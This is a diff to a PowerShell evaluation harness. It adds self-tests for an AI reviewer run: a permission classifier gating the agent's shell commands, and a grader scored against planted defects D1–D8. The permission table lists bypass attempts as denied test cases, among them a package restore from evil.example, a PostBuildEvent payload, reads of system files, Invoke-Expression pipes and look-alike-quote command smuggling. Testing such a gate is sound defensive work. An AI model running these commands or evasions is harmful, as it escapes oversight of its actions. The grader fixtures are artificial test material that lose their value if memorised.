+            return [pscustomobject]@{ Status = $(if ($grade.Valid) { 'PASS' } else { 'INCONCLUSIVE' }); Pass = $grade.Valid; Detail = "$($grade.Detail) patchCommit=$(Get-ReviewPatchCommit $Target)" }
+        }
         default { throw "Unknown scenario '$Id'." }
     }
 }
@@ -6343,7 +6671,7 @@ function Invoke-ReviewAskSelfTest([string]$Temp) {
     $denyOff = Get-DialogAnswer $pushRequest 'review' -BundleRoot $root -ScratchRoot $scratchFake
     $denyNoRoot = Get-DialogAnswer $pushRequest 'review' -CompleteReview
     if ($denyOff.message -cne $oldText -or $denyNoRoot.message -cne $oldText) { throw "B-416 dialog the opt-in off denial message is not the old text: $($denyOff.message)" }
-    if (-not $denyOn.message.Contains($root) -or $denyOn.message.Length -gt 800 -or $denyOn.message -cnotmatch 'allow list covers still run' -or $denyOn.message -cnotmatch 'review-scope\.ps1' -or $denyOn.message -cnotmatch 'test-weakening-scan\.ps1' -or $denyOn.message -cnotmatch 'Get-FileHash -LiteralPath' -or $denyOn.message -cnotmatch 'Remove-Item -LiteralPath' -or $denyOn.message -cnotmatch 'no variables, chaining or pipes') { throw "B-416 dialog the opt-in on denial message does not name the bundle root and what is approved: $($denyOn.message)" }
+    if (-not $denyOn.message.Contains($root) -or $denyOn.message.Length -gt 1100 -or $denyOn.message -cnotmatch 'allow list covers still run' -or $denyOn.message -cnotmatch 'review-scope\.ps1' -or $denyOn.message -cnotmatch 'test-weakening-scan\.ps1' -or $denyOn.message -cnotmatch 'Get-FileHash -LiteralPath' -or $denyOn.message -cnotmatch 'Remove-Item -LiteralPath' -or $denyOn.message -cnotmatch 'no variables, chaining or pipes') { throw "B-416 dialog the opt-in on denial message does not name the bundle root and what is approved: $($denyOn.message)" }
     # 8.3 short names: the root is on its long form; a request in short form is refused unless it is the root's own form.
     if ([OperatingSystem]::IsWindows()) {
         $longDir = Join-Path $tempDir 'B416SelfTestLongFolderName'
@@ -7037,7 +7365,7 @@ function Invoke-SkillUseSelfTestIn([string]$Temp) {
     # The live loop: the overlay patch lands inside the overlay's commit, multi-turn streams are read for skillUse, and -Live
     # checks every overlay patch against its overlay before any spend.
     $selfText = (Get-Content -Raw -LiteralPath $PSCommandPath).Replace((Get-Command Invoke-SkillUseSelfTestIn).ScriptBlock.Ast.Extent.Text, '')
-    if ($selfText -notmatch [regex]::Escape('-AllowMultiTurn:($caseFixture -in $contractFixtures -or $case.assertion -in @(''skillUse'', ''reportWrite'', ''reportProc'', ''optionsPlan'', ''recordOffer'', ''reviewOffer'', ''unansweredGo'', ''businessTerm'', ''reviewComments''))')) { throw 'the live loop does not read a multi-turn stream for the skill-use and report cases' }
+    if ($selfText -notmatch [regex]::Escape('-AllowMultiTurn:($caseFixture -in $contractFixtures -or $case.assertion -eq ''reviewRun'' -or $case.assertion -in @(''skillUse'', ''reportWrite'', ''reportProc'', ''optionsPlan'', ''recordOffer'', ''reviewOffer'', ''unansweredGo'', ''businessTerm'', ''reviewComments''))')) { throw 'the live loop does not read a multi-turn stream for the skill-use and report cases' }
     if ($selfText -notmatch [regex]::Escape('Initialize-OverlayPreflight $overlayCase $preflightOverlay') -or $selfText -notmatch [regex]::Escape('Initialize-GeneratedOverlay $Path ([string]$overlayCase.overlay) -Patch (Join-Path $repo "meta/eval-fixtures/$($overlayCase.overlayPatch)")')) { throw '-Live does not check each overlay patch against its overlay before any spend' }
     Write-Output "PASS: B-514 orders-v2 is fixture v2 without an overlay; the approved and no-skill patches land inside the overlay's one commit and a patch that does not apply is refused; slugs are the discovered drafts naming EventRegistry and ReportCatalog; -AllowedTools swaps --dangerously-skip-permissions for acceptEdits and the list; the six scenarios are pinned. Grader, good event: $($quoted['a complete event, its draft called']) | no registry line: $($quoted['an event with no registry line']) | good report: $($quoted['a complete report, its draft called']) | no GRANT: $($quoted['a report with no GRANT']) | Copilot, no skill call: $($quoted['copilot no-skill']) | Copilot, skill tool: $($quoted['copilot skill-tool'])"
 }
@@ -7331,6 +7659,254 @@ function Invoke-BusinessTermSelfTest([string]$Temp) {
     $loopText = (Get-Command Invoke-EvalCases).ScriptBlock.Ast.Extent.Text
     if ($loopText -notmatch [regex]::Escape('($case.followUpAlways -or (Test-B406NoFileWrite $legOne $target))') -or $loopText -notmatch [regex]::Escape("-and `$case.assertion -ne 'businessTerm'")) { throw 'B-534 the live loop does not send an always-sent follow-up or read a businessTerm case as two legs' }
     Write-Output "PASS: B-534 the three patches apply to the S overlay (CRM table with IsActive, marketing view, K1 and K2 wiki entries that pass wiki-check, no definition derivable from the tree); the five scenarios are pinned. Grader, correct: $($quoted['a correct finance view, entry read']) | CRM flag bound: $($quoted['a view on the CRM IsActive flag, nothing said']) | K2 followed: $($quoted['the K2 entry followed, nothing said'])"
+}
+
+# B-467 R2 (.claude/plans/2026-11-20-b467-r2.md, "Runner work" 1): the /review run's tree is the committed install, the committed target patch
+# (arm O only) and the three subject files uncommitted, so `git status` lists the subject and nothing else in both arms. Red first: with the
+# patch left uncommitted `git status` listed the six reviewer agent files beside the subject.
+function Invoke-ReviewRunSelfTest([string]$Temp) {
+    $subject = Join-Path $repo 'meta/eval-fixtures/b467-review/subject'
+    $patch = Join-Path $repo 'meta/eval-fixtures/target-patches/b467-omit-claudemd.patch'
+    $wantPaths = @([IO.File]::ReadAllLines("$subject.sha256") | Where-Object { $_.Trim() } | ForEach-Object { $_.Substring(66) } | Sort-Object)
+    if ($wantPaths.Count -ne 3) { throw "B-467 the subject manifest lists $($wantPaths.Count) files, not 3" }
+    $status = { param([string]$Root) @(git -C $Root status --porcelain=v1 --untracked-files=all | ForEach-Object { $_.Substring(3) } | Sort-Object) }
+    $build = {
+        param([string]$Name)
+        $root = Join-Path $Temp $Name
+        New-EvalRepo $root orders-v2
+        Install-Framework $root dotnet | Out-Null
+        git -C $root add -A
+        git -C $root commit --quiet -m 'install'
+        $root
+    }
+    $armO = & $build 'b467-arm-o'
+    [void](Initialize-ReviewSubject $armO $subject $patch)
+    $listed = & $status $armO
+    if (($listed -join '|') -cne ($wantPaths -join '|')) { throw "B-467 subject setup: git status lists $(@($listed | Where-Object { $_ -notin $wantPaths }) -join ', ') beside the subject (the target patch was left uncommitted); it must list the three subject files and nothing else" }
+    $oCommits = [int](git -C $armO rev-list --count HEAD)
+    if (-not (Get-ReviewPatchCommit $armO) -or (Get-ReviewPatchCommit (Join-Path $Temp 'not-a-repo'))) { throw 'B-467 the row does not say the patch commit is present in arm O' }
+    if ((git -C $armO log -1 --format=%s) -cnotmatch 'omitClaudeMd' -or (git -C $armO diff --stat HEAD~1 HEAD | Select-String -SimpleMatch '6 files changed').Count -ne 1) { throw 'B-467 arm O: the last commit is not the six-file target patch' }
+    $armK = & $build 'b467-arm-k'
+    $kBefore = Initialize-ReviewSubject $armK $subject ''
+    if (Get-ReviewPatchCommit $armK) { throw 'B-467 arm K holds a patch commit' }
+    if (($(& $status $armK) -join '|') -cne ($wantPaths -join '|') -or $kBefore -ne $oCommits - 1) { throw "B-467 arm K: git status or commit count is wrong (commits $kBefore, arm O $oCommits)" }
+    # The patch rule: a patch that changes one other line, or names five files, is refused before the tree is touched; a subject byte off the manifest likewise.
+    $patchText = [IO.File]::ReadAllText($patch)
+    $other = Join-Path $Temp 'other.patch'
+    [IO.File]::WriteAllText($other, $patchText.Replace('+omitClaudeMd: true', '+omitClaudeMd: false'))
+    $five = Join-Path $Temp 'five.patch'
+    [IO.File]::WriteAllText($five, $patchText.Substring($patchText.IndexOf('diff --git', 10)))
+    foreach ($bad in @($other, $five)) {
+        $fresh = & $build ('b467-bad-' + (Split-Path -Leaf $bad))
+        $refused = $false
+        try { [void](Initialize-ReviewSubject $fresh $subject $bad) } catch { $refused = $_.Exception.Message -match 'B-467 target patch' }
+        if (-not $refused -or @(git -C $fresh status --porcelain).Count) { throw "B-467 target patch $(Split-Path -Leaf $bad) was not refused, or left the tree changed" }
+    }
+    $tampered = Join-Path $Temp 'subject-tampered'
+    Copy-Item -LiteralPath $subject -Destination $tampered -Recurse
+    Copy-Item -LiteralPath "$subject.sha256" -Destination "$tampered.sha256"
+    Add-Content -LiteralPath (Join-Path $tampered 'src/Orders.Domain/Entities/Invoice.cs') -Value '// x'
+    $refused = $false
+    try { [void](Initialize-ReviewSubject (& $build 'b467-tamper') $tampered '') } catch { $refused = $_.Exception.Message -match 'frozen manifest' }
+    if (-not $refused) { throw 'B-467 a subject byte off the manifest was not refused' }
+    # The control channel: no question pick, and the review's classes still allowed.
+    $ask = [pscustomobject]@{ subtype = 'can_use_tool'; tool_name = 'AskUserQuestion'; input = [pscustomobject]@{ questions = @([pscustomobject]@{ question = 'Which?'; options = @([pscustomobject]@{ label = 'Go ahead' }, [pscustomobject]@{ label = 'Go ahead, with review' }) }) } }
+    $reviewCase = [pscustomobject]@{ id = 'b467-review'; assertion = 'reviewRun'; completeReview = $true; subject = 'b467-review' }
+    if ((Get-DialogPick $reviewCase 'claude') -cne 'none' -or (Get-DialogPick $reviewCase 'copilot')) { throw 'B-467 a reviewRun case does not run on the control channel with pick none (Claude only)' }
+    if ((Get-DialogAnswer $ask 'none' -CompleteReview -BundleRoot $Temp -ScratchRoot (Join-Path $Temp 'scratch')).behavior -ne 'deny') { throw 'B-467 the question tool was answered on a run with no pick' }
+    if (-not (Get-DialogLaunchRefusal $reviewCase 'claude' @()) -or -not (Get-DialogLaunchRefusal $reviewCase 'copilot' @('Read')) -or (Get-DialogLaunchRefusal $reviewCase 'claude' @('Read'))) { throw 'B-467 the reviewRun launch rule is wrong: it needs -Executor claude and -AllowedTools' }
+    $selfText = (Get-Content -Raw -LiteralPath $PSCommandPath).Replace((Get-Command Invoke-ReviewRunSelfTest).ScriptBlock.Ast.Extent.Text, '')
+    foreach ($needle in @('$before = Initialize-ReviewSubject $target (Join-Path $repo "meta/eval-fixtures/$($case.subject)/subject") $TargetPatch', '$WarehouseMap -notin @(''generated'',''partial'') -and -not $case.subject) { Invoke-TargetPatch')) {
+        if (-not $selfText.Contains($needle)) { throw "B-467 the live loop does not commit the target patch and copy the subject in: missing $needle" }
+    }
+    Write-Output 'PASS: B-467 the /review tree holds the target patch as its own commit and the subject alone uncommitted (arm K: the subject alone); a patch that is not +omitClaudeMd in the six reviewers and a subject byte off the manifest are refused; the run answers no question and runs on Claude Code with -AllowedTools only'
+}
+
+# B-467 R2 (.claude/plans/2026-11-20-b467-r2.md, "Runner work" 2): reviewers' read-only pipes and chains pass the control channel, a write does not.
+# Red first: on the runner before this change `Get-FileHash -LiteralPath <bundle file> | Select -ExpandProperty Hash` was denied (the line of the
+# first failure: "B-467 permissions: allowed was none, not allowed" for that command).
+function Invoke-ReviewPermissionSelfTest {
+    $tempDir = [IO.Path]::GetTempPath()
+    $scratch = Join-Path $tempDir 'ai-tech-lead-agent-evals-selftest'
+    $root = Join-Path $tempDir 'b416-bundle-0a1b2c3d'
+    $bundle = Join-Path $root 'bundle'
+    $m = Join-Path $bundle 'manifest.json'
+    $target = Join-Path $scratch 'b467-review/target'
+    $outside = Join-Path ([IO.Path]::GetPathRoot($tempDir)) 'work-repo/out/x.cs'
+    $other = Join-Path $tempDir 'other/x'
+    $scope = "pwsh -NoProfile -File scripts/review-scope.ps1 -Mode Uncommitted -OutputPath `"$bundle`""
+    $class = { param([string]$Tool, [string]$Command, [bool]$On = $true) Get-ReviewPermissionClass ([pscustomobject]@{ subtype = 'can_use_tool'; tool_name = $Tool; input = [pscustomobject]@{ command = $Command } }) $(if ($On) { $root } else { '' }) $scratch $target }
+    $cases = @(
+        @('PowerShell', "Get-FileHash -LiteralPath `"$m`" | Select -ExpandProperty Hash", 'allowed', 'the plan''s hash pipe with the Select alias'),
+        @('PowerShell', "Get-FileHash -LiteralPath `"$m`" | Select-Object -ExpandProperty Hash", 'allowed', 'the same with Select-Object'),
+        @('PowerShell', "(Get-FileHash -LiteralPath `"$m`").Hash", 'allowed', 'a parenthesized hash and its property'),
+        @('PowerShell', "Write-Output `"hash: `$(Get-FileHash -LiteralPath `"$m`" | Select -ExpandProperty Hash)`"", 'denied', 'a read-only `$( )` inside a string'),
+        @('PowerShell', "`$(Get-Content -LiteralPath `"$m`")", 'denied', 'a read-only `$( )` Get-Content of a bundle file'),
+        @('PowerShell', "Get-FileHash -LiteralPath `"$m`" 2>&1 | Select -ExpandProperty Hash", 'allowed', 'the 2>&1 redirect'),
+        @('PowerShell', "Get-ChildItem -Path `"$bundle`" -Recurse -File | sort -Property Length -Descending | Select -First 5", 'allowed', 'Get-ChildItem into sort and Select'),
+        @('PowerShell', "Get-Content `"$bundle/a.patch`" | Measure-Object -Line", 'allowed', 'Get-Content into Measure-Object'),
+        @('PowerShell', 'Get-Content AGENTS.md | Select -First 20', 'allowed', 'a relative target file'),
+        @('PowerShell', "Get-Content `"$target/AGENTS.md`" -Raw", 'allowed', 'an absolute target file'),
+        @('PowerShell', "Test-Path `"$m`"; Get-FileHash -LiteralPath `"$m`"", 'allowed', 'a ; chain'),
+        @('PowerShell', "Test-Path `"$m`" && Get-FileHash -LiteralPath `"$m`"", 'allowed', 'a && chain'),
+        @('PowerShell', 'git diff --stat | Select -Last 3', 'allowed', 'read-only git into Select'),
+        @('PowerShell', 'git log -1 --format=%s', 'allowed', 'git log'),
+        @('PowerShell', 'git diff HEAD~1..HEAD -- src/Orders.Api', 'allowed', 'git diff over a range and a relative path'),
+        @('PowerShell', "Select-String -Pattern 'Refund' -Path src/Orders.Api/Controllers/CheckoutController.cs | Select -First 5", 'allowed', 'Select-String over a target file'),
+        @('PowerShell', 'dotnet build Orders.sln 2>&1 | Select -Last 3', 'allowed', 'dotnet build into Select'),
+        @('PowerShell', "$scope; Get-FileHash -LiteralPath `"$m`"", 'allowed', 'the scope capture chained to a hash'),
+        @('PowerShell', "Get-FileHash -LiteralPath `"$m`" | Set-Content `"$bundle/h.txt`"", 'denied', 'a pipe into Set-Content'),
+        @('PowerShell', "Get-FileHash -LiteralPath `"$m`" | Out-File x.txt", 'denied', 'a pipe into Out-File'),
+        @('PowerShell', "Get-Content `"$m`" > x.txt", 'denied', 'a > redirect'),
+        @('PowerShell', "Get-Content `"$m`" >> x.txt", 'denied', 'a >> redirect'),
+        @('PowerShell', "Get-Content `"$m`" | Tee-Object x.txt", 'denied', 'a pipe into Tee-Object'),
+        @('PowerShell', "Get-Content `"$outside`" | Select -First 1", 'denied', 'a file outside the bundle root and target'),
+        @('PowerShell', "Get-Content `"$other`" | Select -First 1", 'denied', 'another temp path'),
+        @('PowerShell', 'Get-Content ..\x.txt | Select -First 1', 'denied', 'a relative path with dot-dot'),
+        @('PowerShell', 'Get-Content C:\Windows\win.ini | Select -First 1', 'denied', 'a rooted path elsewhere'),
+        @('PowerShell', "Get-FileHash -LiteralPath `$env:TEMP\x | Select -ExpandProperty Hash", 'denied', 'a variable in the path'),
+        @('PowerShell', "`$h = Get-FileHash -LiteralPath `"$m`"", 'denied', 'an assignment'),
+        @('PowerShell', "Get-Content `"$m`" | ForEach-Object { `$_ }", 'denied', 'a script block'),
+        @('PowerShell', "Get-Content `"$m`" | Invoke-Expression", 'denied', 'a pipe into Invoke-Expression'),
+        @('PowerShell', "Get-Content `"$m`"; Remove-Item -LiteralPath `"$m`"", 'denied', 'Remove-Item in a chain'),
+        @('PowerShell', "Get-Content (Get-ChildItem -Path `"$bundle`")", 'denied', 'a path produced by a sub-expression'),
+        @('PowerShell', "Write-Output `$(Set-Content x y)", 'denied', 'a write inside `$( )'),
+        @('PowerShell', "Get-Content `"$m`" & Remove-Item x", 'denied', 'a lone &'),
+        @('PowerShell', "Get-Content `"$m`" `` | Select -First 1", 'denied', 'a backtick'),
+        @('PowerShell', "Get-FileHash -LiteralPath `"$m`" -Algorithm MD5 | Select -ExpandProperty Hash", 'denied', 'another algorithm'),
+        @('PowerShell', 'git push', 'denied', 'git push'),
+        @('PowerShell', 'git diff --output=x.patch', 'denied', 'git diff --output'),
+        @('PowerShell', 'git -C .. status', 'denied', 'git -C'),
+        @('PowerShell', 'git config user.name x', 'denied', 'git config'),
+        @('PowerShell', 'git log | Out-File x.txt', 'denied', 'git into Out-File'),
+        @('PowerShell', 'dotnet publish | Select -Last 3', 'denied', 'dotnet publish'),
+        # H7 attack round: look-alike quotes, dotnet arguments, comma arrays, a named -Pattern, splatting, -ErrorAction Inquire, device names.
+        @('PowerShell', ('Write-Output ''a' + [char]0x2018 + ' ; Get-Content x ; ' + [char]0x2018 + 'b'''), 'denied', 'item 1: a U+2018 quote look-alike (the quote tracking would see the middle as outside)'),
+        @('PowerShell', ('Write-Output "a' + [char]0x201C + ' ; Get-Content x ; ' + [char]0x201C + 'b"'), 'denied', 'item 1: a U+201C quote look-alike'),
+        @('PowerShell', ('Get-Content ' + [char]0x2013 + 'Path x'), 'denied', 'item 1: an en dash for the parameter dash'),
+        @('PowerShell', 'dotnet build -p:PostBuildEvent=calc', 'denied', 'item 2: dotnet build -p: PostBuildEvent'),
+        @('PowerShell', 'dotnet build -bl:C:\out\x.binlog', 'denied', 'item 2: dotnet build -bl: binary log'),
+        @('PowerShell', 'dotnet build -p:OutDir=C:\out\', 'denied', 'item 2: dotnet build -p:OutDir'),
+        @('PowerShell', "dotnet test --logger 'trx;LogFileName=C:\out\x.trx'", 'denied', 'item 2: dotnet test --logger'),
+        @('PowerShell', 'dotnet build -flp:logfile=C:\out\x.log', 'denied', 'item 2: dotnet build -flp'),
+        @('PowerShell', 'dotnet build -p:BaseIntermediateOutputPath=C:\out\', 'denied', 'item 2: dotnet build -p:BaseIntermediateOutputPath'),
+        @('PowerShell', 'dotnet build -t:Exec', 'denied', 'item 2: dotnet build -t:'),
+        @('PowerShell', 'dotnet restore --source http://evil.example/', 'denied', 'item 2: dotnet restore --source'),
+        @('PowerShell', 'dotnet build', 'allowed', 'item 2: a plain dotnet build'),
+        @('PowerShell', 'dotnet build Orders.sln --no-restore -c Release -v q --nologo', 'allowed', 'item 2: dotnet build with the fixed argument list'),
+        @('PowerShell', 'Get-Content a,\Windows\win.ini', 'denied', 'item 3: a comma array whose second path is outside'),
+        @('PowerShell', 'Get-ChildItem a,\Windows', 'denied', 'item 3: Get-ChildItem comma array'),
+        @('PowerShell', 'Select-String -Pattern x C:\Windows\win.ini', 'denied', 'item 4: a named -Pattern leaves a bare path outside'),
+        @('PowerShell', 'Select-String -Pattern x src/Orders.Api/a.cs', 'allowed', 'item 4: a named -Pattern with a target path'),
+        @('PowerShell', 'Get-Content @PROFILE', 'denied', 'item 5: splatting'),
+        @('PowerShell', "Get-Content `"$m`" -ErrorAction Inquire", 'denied', 'item 6: -ErrorAction Inquire'),
+        @('PowerShell', "Get-Content `"$m`" -ErrorAction SilentlyContinue", 'allowed', 'item 6: -ErrorAction SilentlyContinue'),
+        @('PowerShell', 'Get-Content NUL', 'denied', 'item 7: the NUL device'),
+        @('PowerShell', 'Get-Content CON.txt', 'denied', 'item 7: the CON device with an extension'),
+        @('PowerShell', "Get-Content `"$bundle\com1`"", 'denied', 'item 7: a COM1 device under the bundle root'),
+        # H8: a pipe into a segment that binds piped strings as paths, fed by a segment that emits arbitrary strings or file contents.
+        @('PowerShell', 'Write-Output C:\Windows | Get-ChildItem', 'denied', 'H8: Write-Output into Get-ChildItem'),
+        @('PowerShell', 'echo C:\Windows\win.ini | gc', 'denied', 'H8: echo into gc'),
+        @('PowerShell', "Get-Content `"$m`" | Get-Content", 'denied', 'H8: Get-Content into Get-Content'),
+        @('PowerShell', 'Write-Host C:\Windows | Test-Path', 'denied', 'H8: Write-Host into Test-Path'),
+        @('PowerShell', "Get-Content `"$m`" | Get-FileHash", 'denied', 'H8: Get-Content into Get-FileHash'),
+        @('PowerShell', "Select-String -Pattern x -Path `"$m`" | Select -ExpandProperty Path | Get-ChildItem", 'denied', 'H8: Select-String through Select -ExpandProperty into Get-ChildItem'),
+        @('PowerShell', "Get-Content `"$m`" | sort | Get-ChildItem", 'denied', 'H8: taint carried through sort'),
+        @('PowerShell', "Get-Content `"$m`" | Select-String x", 'allowed', 'H8: Get-Content into Select-String'),
+        @('PowerShell', "Get-ChildItem `"$bundle`" | Get-FileHash", 'allowed', 'H8: Get-ChildItem FileInfo into Get-FileHash'),
+        @('PowerShell', "Get-ChildItem `"$bundle`" -Recurse -File | Get-FileHash | Select -ExpandProperty Hash", 'allowed', 'H8: Get-ChildItem into Get-FileHash into Select Hash'),
+        @('PowerShell', "Get-ChildItem `"$bundle`" | Measure-Object", 'allowed', 'H8: Get-ChildItem into Measure-Object'),
+        @('PowerShell', "Get-ChildItem `"$bundle`" | sort -Property Length | Select -First 3 | Get-FileHash", 'allowed', 'H8: sort and Select -First keep a checked pipeline clean'),
+        @('Bash', "Get-FileHash -LiteralPath `"$m`" | Select -ExpandProperty Hash", 'denied', 'the pipe through the Bash tool'),
+        @('PowerShell', "Get-FileHash -LiteralPath `"$m`" | Select -ExpandProperty Hash", 'denied-off', 'the opt-in off')
+    )
+    foreach ($case in $cases) {
+        $on = $case[2] -ne 'denied-off'
+        $got = & $class $case[0] $case[1] $on
+        $want = $case[2] -eq 'allowed'
+        if (($got -ne 'none') -ne $want) { throw "B-467 permissions: $($case[3]) was $(if ($got -eq 'none') { 'denied' } else { "allowed ($got)" }), not $(if ($want) { 'allowed' } else { 'denied' }): $($case[1])" }
+    }
+    $answer = { param([string]$Command) (Get-DialogAnswer ([pscustomobject]@{ subtype = 'can_use_tool'; tool_name = 'PowerShell'; input = [pscustomobject]@{ command = $Command } }) 'none' -CompleteReview -BundleRoot $root -ScratchRoot $scratch -WriteRoot $target).behavior }
+    if ((& $answer "Get-FileHash -LiteralPath `"$m`" | Select -ExpandProperty Hash") -ne 'allow' -or (& $answer "Get-FileHash -LiteralPath `"$m`" | Set-Content `"$bundle/h.txt`"") -ne 'deny') { throw 'B-467 permissions: the control channel does not allow the hash pipe and deny the write pipe' }
+    Write-Output 'PASS: B-467 reviewer permissions: pipes and chains of read-only PowerShell (Get-Content, Get-FileHash, Test-Path, Get-ChildItem, Select-String, read-only git, dotnet build|test|restore, into Select, sort, Measure-Object), parenthesized sub-expressions and 2>&1 pass with literal paths under the bundle root or the target; a pipe into Set-Content, Out-File or Tee-Object, a redirect, a variable, a `$( )` sub-expression, a script block, Remove-Item in a chain, a path outside the bundle root and target, a write-form git and the Bash tool stay denied'
+}
+
+# B-467 R2 (.claude/plans/2026-11-20-b467-r2.md, "Runner work" 3, "Scoring" and "Validity"): the grader on hand-made streams. Red first: with no
+# grader the first case failed "Unknown scenario 'b467-review'".
+function Invoke-ReviewRunGradeSelfTest([string]$Temp) {
+    $names = @('convention-check', 'debt-radar', 'bloat-radar', 'solid-check', 'test-critic', 'security-auditor')
+    $rows = [ordered]@{
+        D1 = '| 1 | should-fix | CheckoutController.Refund | convention-check | Interpolated log message: use a structured message template | Use a template |'
+        D2 = '| 2 | note | src/Orders.Api/Controllers/CheckoutController.cs:1 | convention-check | Unused using System.Text; remove it | Remove |'
+        D3 = '| 3 | blocker | CheckoutController.cs:30 | security-auditor | The Authorization header is written to the log | Never log it |'
+        D4 = '| 4 | should-fix | EventRegistryTests.cs:15 | test-critic | Registry_can_be_constructed asserts NotNull on a freshly built object | Delete it |'
+        D5 = '| 5 | should-fix | EventRegistryTests.cs:10 | test-critic | The InlineData for InvoiceIssuedEvent was removed | Restore it |'
+        D6 = '| 6 | should-fix | CheckoutController.cs:38 | solid-check | A switch on reason with three arms breaks open-closed | Use a strategy |'
+        D7 = '| 7 | blocker | CheckoutController.cs:60 | bloat-radar | catch (Exception) swallows the failure and returns 202 | Let it throw |'
+        D8 = '- TECH_DEBT entries newly relevant: DEBT-006 (the test suite only guards registration lists)'
+    }
+    $report = {
+        param([string[]]$Without = @(), [string[]]$Extra = @(), [string]$Verdict = '### Verdict: REQUEST CHANGES - 3 blockers; reviewers returned: all; missing: none')
+        $issues = @($rows.Keys | Where-Object { $_ -ne 'D8' -and $_ -notin $Without } | ForEach-Object { $rows[$_] }) + $Extra
+        (@('## Review: uncommitted changes', '', $Verdict, '', '### Issues', '| # | Severity | File:line | Raised by | Issue | Suggestion |', '|---|----------|-----------|-----------|-------|------------|') + $issues +
+            @('', '### Architecture Notes') + $(if ('D8' -notin $Without) { @($rows['D8']) } else { @('- Debt trajectory: neutral') })) -join "`n"
+    }
+    $stream = {
+        param([string[]]$Dispatched = $names, [string[]]$Returned = $names, [string]$Final, [string]$Subtype = 'success', [hashtable]$Reply = @{}, [string[]]$Stub = @(), [string]$ParentText = '')
+        $events = [Collections.Generic.List[object]]::new()
+        $events.Add([pscustomobject]@{ type = 'system'; subtype = 'init' })
+        foreach ($name in $Dispatched) { $events.Add([pscustomobject]@{ type = 'assistant'; parent_tool_use_id = $null; message = [pscustomobject]@{ content = @([pscustomobject]@{ type = 'tool_use'; id = "t-$name"; name = 'Task'; input = [pscustomobject]@{ subagent_type = $name; prompt = 'review' } }) } }) }
+        foreach ($name in $Returned) {
+            $text = if ($Reply.ContainsKey($name)) { $Reply[$name] } elseif ($name -in $Stub) { 'Async agent launched successfully' } else { "findings from $name" }
+            $events.Add([pscustomobject]@{ type = 'user'; message = [pscustomobject]@{ content = @([pscustomobject]@{ type = 'tool_result'; tool_use_id = "t-$name"; content = $text }) } })
+        }
+        if ($ParentText) { $events.Add([pscustomobject]@{ type = 'assistant'; parent_tool_use_id = $null; message = [pscustomobject]@{ content = @([pscustomobject]@{ type = 'text'; text = $ParentText }) } }) }
+        $events.Add([pscustomobject]@{ type = 'result'; subtype = $Subtype; is_error = ($Subtype -ne 'success'); result = $Final; total_cost_usd = 0.55 })
+        [pscustomobject]@{ Events = $events }
+    }
+    $grade = {
+        param($Transcript, $Permissions = @(), [string]$Id = 'b467-review')
+        if ($null -ne $Permissions) { $Transcript | Add-Member -NotePropertyName Permissions -NotePropertyValue @($Permissions) -Force }
+        Test-ScenarioEvidence $Id $Temp $Transcript 0
+    }
+    $check = {
+        param([string]$Name, $Result, [string]$Status, [string]$Pattern)
+        if ($null -eq $Result -or $Result.Status -ne $Status -or $Result.Detail -notmatch $Pattern) { throw "B-467 grader: $Name graded $(if ($Result) { "$($Result.Status): $($Result.Detail)" } else { 'nothing' }), not $Status matching $Pattern" }
+    }
+    $all = 'defects=D1:found,D2:found,D3:found,D4:found,D5:found,D6:found,D7:found,D8:found'
+    # The plan's example: a D1 row naming CheckoutController.Refund with no .cs is a match, and the full set is 8 of 8.
+    & $check 'every defect found, no .cs on the D1 row' (& $grade (& $stream -Final (& $report))) 'PASS' "^valid=True reason=none found=8/8 $all other=0 multi=0 reviewers=6/6 "
+    & $check 'a defect missing from the report' (& $grade (& $stream -Final (& $report -Without @('D5')))) 'PASS' '^valid=True reason=none found=7/8 .*D5:missed.* other=0 '
+    & $check 'D1 without its file stem is missed' (& $grade (& $stream -Final (& $report -Without @('D1') -Extra @('| 9 | note | Orders.Api | convention-check | The log message is interpolated | x |')))) 'PASS' 'found=7/8 .*D1:missed.* other=1 '
+    & $check 'D8 needs DEBT-006 only, from the Architecture Notes line' (& $grade (& $stream -Final (& $report -Without @('D8')))) 'PASS' 'found=7/8 .*D8:missed'
+    & $check 'D8 on an Issues-table row naming DEBT-006' (& $grade (& $stream -Final (& $report -Without @('D8') -Extra @('| 9 | note | TECH_DEBT.md | debt-radar | DEBT-006 still applies to the registry tests | x |')))) 'PASS' '^valid=True reason=none found=8/8 .*D8:found.* other=0 '
+    & $check 'D8 not found when DEBT-006 sits under another heading' (& $grade (& $stream -Final ((& $report -Without @('D8')) + "`n`n### Summary`n- DEBT-006 was mentioned in passing"))) 'PASS' 'found=7/8 .*D8:missed'
+    & $check 'D2 needs both System.Text and unused or remove' (& $grade (& $stream -Final (& $report -Without @('D2') -Extra @('| 9 | note | CheckoutController.cs:1 | convention-check | System.Text is imported | x |')))) 'PASS' 'found=7/8 .*D2:missed.* other=1 '
+    & $check 'an invented finding is counted, not scored' (& $grade (& $stream -Final (& $report -Extra @('| 9 | note | Orders.Api | solid-check | No authorization on the endpoint | x |')))) 'PASS' '^valid=True reason=none found=8/8 .* other=1 '
+    & $check 'one row matching two defects counts for both and is reported' (& $grade (& $stream -Final (& $report -Without @('D6', 'D7') -Extra @('| 9 | should-fix | CheckoutController.cs:38 | solid-check | The switch on reason and the catch that swallows the error | x |')))) 'PASS' 'found=8/8 .* other=0 multi=1 '
+    # Validity: each failure reads invalid and is named, and the findings are still reported.
+    & $check 'five reviewers dispatched' (& $grade (& $stream -Dispatched $names[0..4] -Returned $names[0..4] -Final (& $report))) 'INCONCLUSIVE' '^valid=False reason=reviewers missing: security-auditor '
+    & $check 'a reviewer dispatched and never returned' (& $grade (& $stream -Returned $names[0..4] -Final (& $report))) 'INCONCLUSIVE' '^valid=False reason=reviewers missing: security-auditor '
+    & $check 'a reviewer that returned CANNOT EXAMINE' (& $grade (& $stream -Reply @{ 'test-critic' = 'CANNOT EXAMINE: the manifest hash could not be computed' } -Final (& $report))) 'INCONCLUSIVE' '^valid=False reason=CANNOT EXAMINE '
+    & $check 'a parent message that says CANNOT EXAMINE' (& $grade (& $stream -ParentText 'Review stopped: CANNOT EXAMINE the bundle' -Final (& $report))) 'INCONCLUSIVE' '^valid=False reason=CANNOT EXAMINE '
+    & $check 'a denied permission' (& $grade (& $stream -Final (& $report)) @([ordered]@{ tool = 'PowerShell'; input = 'Get-FileHash x | Set-Content y'; decision = 'deny'; class = 'none' })) 'INCONCLUSIVE' '^valid=False reason=permission denied: PowerShell '
+    & $check 'an allowed permission is no harm' (& $grade (& $stream -Final (& $report)) @([ordered]@{ tool = 'PowerShell'; input = 'Get-FileHash x'; decision = 'allow'; class = 'hash' })) 'PASS' '^valid=True '
